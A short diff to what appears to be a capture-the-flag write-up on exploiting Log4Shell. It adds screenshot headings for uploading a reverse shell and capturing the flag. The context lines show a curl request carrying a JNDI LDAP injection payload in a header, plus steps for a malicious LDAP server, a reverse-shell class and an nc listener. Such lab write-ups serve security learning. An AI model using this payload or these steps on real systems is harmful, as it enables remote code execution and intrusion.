@@ -54,4 +54,9 @@ curl $URL -H 'X-Api-Version: ${jndi:ldap://x${hostName}.L4J.z5wbevl1c0v3t8gxs856
 - Upload the reverse shell java class in HTTP Server 
 - Start malicious ldap server giving the HTTP Server URL for redirecting the victim
 - Start nc listener for reverse shell
+
+## Upload reverse shell 
+![Screenshot_2022-04-08_23_47_51](https://user-images.githubusercontent.com/45040001/162830955-a74283af-35c7-454e-8a61-dd7534a3ff69.png)
+
+## Final flag
 ![flag](https://user-images.githubusercontent.com/45040001/162826580-8d33dcae-e97f-4cdc-9679-749646111c9b.png)
